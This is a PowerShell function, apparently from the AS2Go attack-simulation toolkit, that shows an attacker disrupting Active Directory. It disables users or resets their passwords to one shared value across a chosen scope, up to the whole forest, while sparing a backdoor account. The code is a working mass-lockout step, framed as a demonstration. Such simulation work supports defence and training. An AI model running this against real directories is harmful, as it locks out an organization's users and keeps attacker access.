<#
.SYNOPSIS
Disables user accounts or enforces password resets for disruption.

.DESCRIPTION
Disables or resets passwords for domain user accounts while excluding the current backdoor account and
the configured break-glass account. The workflow stops if a configured break-glass DN cannot be resolved.

.EXAMPLE
Invoke-UserAccountDisruption
Runs the user account disruption workflow using the initialized AS2Go module configuration.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.
The backdoor account and configured break-glass account are excluded from all operations.
The workflow stops if the configured break-glass DN cannot be resolved.

.COMPONENT
Category: Main Function

.FUNCTIONALITY
Demonstrates account disruption by disabling users, resetting passwords, or both in a selected AD scope.
Displays domain password policies and offers a shared replacement password for password resets.
The current backdoor account and configured break-glass account are excluded from the selected scope.
#>
function Invoke-UserAccountDisruption {

    $info = Measure-FunctionRuntime -Begin

    If (-not $SkipClearHost) { Clear-Host }
    Write-AS2GoOutput -Type Header -M "Disable user accounts or enforce password resets"
    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)

    $EmojiIcon = [System.Convert]::toInt32("1F600", 16)
    $Smily = [System.Char]::ConvertFromUtf32($EmojiIcon)

    if ([string]::IsNullOrWhiteSpace([string]$global:BDUser)) {
        #Write-AS2GoOutput -Type Warning -Message "Backdoor user is not configured; user account disruption will not run."
    }
    else {
        Write-host "  ... will ignore your new backdoor user " -NoNewline
        Write-host $global:BDUser -ForegroundColor $Script:FGCHighLight -NoNewline
        Write-Host " - $Smily"
    }

    if (Get-ASConfig -Setting "BreakGlassAccount") {
        Write-AS2GoOutput -Type Info -Message "The configured break-glass account will also be excluded."
    }

    #    Write-AS2GoOutput -Type Header -Message "New-UserManipulation"
    #    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
    
    $Forest = Get-ADForest
    $Script:DoaminTypes = Get-DomainType

    $AllDomainsDetails = $Forest.Domains | ForEach-Object {
        Get-DomainPWDetails -DomainName $_
    }

    Write-Host "`nDiscovered Domain Password Policy Settings in the Forest:" -ForegroundColor $Script:FGCHighLight

    $AllDomainsDetails |
    Select-Object `
    @{N = 'Domain'; E = { $_.NetBIOSName } },
    @{N = 'DomainType'; E = { $_.DomainType } },
    @{N = 'Enabled Users'; E = { $_.EnabledUser } },
    @{N = 'Min. Pw Length'; E = { $_.MinPasswordLength } },
    @{N = 'Complexity'; E = { $_.ComplexityEnabled } } | Format-Table -AutoSize

    $title = "Define the action for - User Account Manipulation!"
    $message = "Select the action to perform."
    $Options = @(
        [pscustomobject]@{
            Label = "&Disable Users"
            Help  = "Disable the user accounts in scope."
            Value = "Disable"
        },
        [pscustomobject]@{
            Label = "&PW Reset"
            Help  = "Reset the passwords of the user accounts in scope."
            Value = "PwReset"
        },
        [pscustomobject]@{
            Label = "&Both"
            Help  = "Reset the passwords and disable the user accounts in scope."
            Value = "Both"
        },
        [pscustomobject]@{
            Label = "&Skip"
            Help  = "Skip the entire account manipulation process."
            Value = "Skip"
        }
    )
    
    $Action = Show-DecisionPrompt -Message $message  -Options $Options -Default 0 -Title $title
    If ($Action -eq "Skip") {
        Measure-FunctionRuntime -End -Details $info 
        return 
    }


    $DomainSearchBase = Set-AttackScope -Action "User Account Manipulation"
    
    If ($DomainSearchBase -eq "SKIP") { 
        Measure-FunctionRuntime -End -Details $info 
        return 
    }

    if ($Action -match "^PwReset$|^Both$") {

        $NewRandomPW = Get-RandomPassword

        If (-not $UnAttended) {
            $title = "Confirm or change the random password"
            $message = "The current password is:         $NewRandomPW"
            $Options = @(
                [pscustomobject] @{
                    Label = "&Keep"
                    Help  = "Keep the random password '$NewRandomPW' regarding the password reset."
                    Value = $Script:Yes
                },
                [pscustomobject] @{
                    Label = "&Change"
                    Help  = "Enter a different password regarding the password reset."
                    Value = "Change"
                }
            )

            $prompt = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title
    
            if ($prompt -ne $Script:Yes) {
                do {
                    $NewRandomPW = Read-Host "`n  Enter new password"
                    if ([string]::IsNullOrWhiteSpace($NewRandomPW)) {
                        Write-AS2GoOutput -Type Warning -Message "Please enter at least one character!"
                    }
                }
                while ([string]::IsNullOrWhiteSpace($NewRandomPW))
                Set-ASConfig -Setting "LastPW" -Value $NewRandomPW
            }
        }
    }

   
    If ($UnAttended) {
        $NewRandomPW = Get-RandomPassword
    }


    If ($DomainSearchBase -eq "All Domains in Forest") {
        $domains = (Get-ADForest).Domains
        foreach ($domain in $domains) {
            $DomainSearchBase = (Get-ADDomain -Server $domain).DistinguishedName
            $runtime = Measure-Command {
                Start-UserAccountDisruption -SearchBase $DomainSearchBase -NewPassword $NewRandomPW -Server $domain -Action $action
            }
            Write-log -Message "Finished in $($runtime.TotalSeconds) seconds."
        }
    }
    else {
        $server = Get-BestDomainController -domain $DomainSearchBase
        $runtime = Measure-Command {
            Start-UserAccountDisruption -SearchBase $DomainSearchBase -NewPassword $NewRandomPW -Server $server -Action $action
        }
        Write-log -Message "Finished in $($runtime.TotalSeconds) seconds."
    }

    Measure-FunctionRuntime -End -Details $info
}
